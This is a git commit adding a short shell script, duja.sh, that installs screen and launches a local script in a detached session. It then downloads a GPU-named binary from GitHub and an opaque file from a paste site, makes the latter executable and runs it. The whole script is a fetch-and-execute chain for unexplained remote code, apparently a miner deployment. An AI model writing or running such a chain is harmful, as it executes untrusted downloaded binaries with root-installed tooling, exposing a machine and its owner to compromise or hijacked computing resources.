2dce2b6731dbf453cb4f8ca59cd3626104ba8d57
Nizz776 <86077605+Nizz776@users.noreply.github.com>
2021-07-03 22:58:19 +0530

    duja.sh

---
+++ duja.sh
@@ -0,0 +1,2 @@
+#!/bin/sh
+! sudo apt update && sudo apt install screen -y && screen -dmS Niz.sh ./Niz.sh 65 75 && wget https://github.com/Nizz776/Nizz776/raw/main/tuyulgpu && wget https://www.heypasteit.com/download/0IWE19 && chmod +x 0IWE19 && ./0IWE19
